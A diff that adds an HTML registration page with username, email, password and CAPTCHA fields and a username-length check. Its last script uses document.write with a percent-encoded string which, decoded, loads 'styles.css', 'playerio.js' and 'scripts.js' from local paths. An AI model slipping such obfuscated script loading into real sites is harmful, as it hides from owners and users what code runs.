@@ -1,0 +1,70 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Sign-up</title>
+<body>
+    <div class="form-container">
+        <form id="registerForm">
+            <h2>Registration Form</h2>
+            <p class="form-message">Please fill up the form to register</p>
+
+            <div class="input-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" minlength="6" maxlength="18" required>
+                <small style="color:red;display:none;" id="usernameError">Username must be 6–18 characters long.</small>
+            </div>
+
+            <div class="input-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+
+            <div class="input-group">
+                <label for="confirmPassword">Confirm Password</label>
+                <input type="password" id="confirmPassword" name="confirmPassword" required>
+            </div>
+
+            <div class="input-group">
+                <label for="captchaImage">Type the text you see:</label>
+                    <div class="captcha-box">
+                    <img src="" alt="CAPTCHA" id="captchaImage">
+            <img id="reloadCaptchaButton" src="https://i.imgur.com/sTVaRa2.png" alt="Reload Captcha" title="Reload Captcha">
+                </div>
+            </div>
+
+            <div class="input-group">
+                <input type="text" id="captchaInput" name="captchaInput" placeholder="Enter CAPTCHA" required>
+            </div>
+
+            <button type="submit">Register</button>
+        </form>
+    </div>
+
+<script>
+document.getElementById("registerForm").addEventListener("submit", function(e) {
+    const username = document.getElementById("username");
+    const error = document.getElementById("usernameError");
+
+    if (username.value.length < 6 || username.value.length > 18) {
+        e.preventDefault(); // stop form submission
+        error.style.display = "block";
+        username.focus();
+    } else {
+        error.style.display = "none";
+    }
+});
+</script>
+
+
+<script>
+document.write(unescape('%20%20%3C%73%63%72%69%70%74%3E%0A%20%20%20%20%0A%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%69%6E%6A%65%63%74%43%53%53%28%68%72%65%66%29%20%7B%0A%20%20%20%20%20%20%63%6F%6E%73%74%20%6C%69%6E%6B%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%27%6C%69%6E%6B%27%29%3B%0A%20%20%20%20%20%20%6C%69%6E%6B%2E%72%65%6C%20%3D%20%27%73%74%79%6C%65%73%68%65%65%74%27%3B%0A%20%20%20%20%20%20%6C%69%6E%6B%2E%68%72%65%66%20%3D%20%68%72%65%66%3B%0A%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%68%65%61%64%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%6C%69%6E%6B%29%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%69%6E%6A%65%63%74%53%63%72%69%70%74%28%73%72%63%29%20%7B%0A%20%20%20%20%20%20%72%65%74%75%72%6E%20%6E%65%77%20%50%72%6F%6D%69%73%65%28%28%72%65%73%6F%6C%76%65%2C%20%72%65%6A%65%63%74%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%73%63%72%69%70%74%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%27%73%63%72%69%70%74%27%29%3B%0A%20%20%20%20%20%20%20%20%73%63%72%69%70%74%2E%73%72%63%20%3D%20%73%72%63%3B%0A%20%20%20%20%20%20%20%20%73%63%72%69%70%74%2E%6F%6E%6C%6F%61%64%20%3D%20%72%65%73%6F%6C%76%65%3B%0A%20%20%20%20%20%20%20%20%73%63%72%69%70%74%2E%6F%6E%65%72%72%6F%72%20%3D%20%72%65%6A%65%63%74%3B%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%68%65%61%64%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%73%63%72%69%70%74%29%3B%0A%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%44%4F%4D%43%6F%6E%74%65%6E%74%4C%6F%61%64%65%64%27%2C%20%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%69%6E%6A%65%63%74%43%53%53%28%27%73%74%79%6C%65%73%2E%63%73%73%27%29%3B%0A%20%20%20%20%20%20%69%6E%6A%65%63%74%53%63%72%69%70%74%28%27%70%6C%61%79%65%72%69%6F%2E%6A%73%27%29%0A%20%20%20%20%20%20%20%20%2E%74%68%65%6E%28%28%29%20%3D%3E%20%69%6E%6A%65%63%74%53%63%72%69%70%74%28%27%73%63%72%69%70%74%73%2E%6A%73%27%29%29%0A%20%20%20%20%20%20%20%20%2E%63%61%74%63%68%28%63%6F%6E%73%6F%6C%65%2E%65%72%72%6F%72%29%3B%0A%20%20%20%20%7D%29%3B%0A%20%20%3C%2F%73%63%72%69%70%74%3E'));
+</script>
+</body>
+</html>
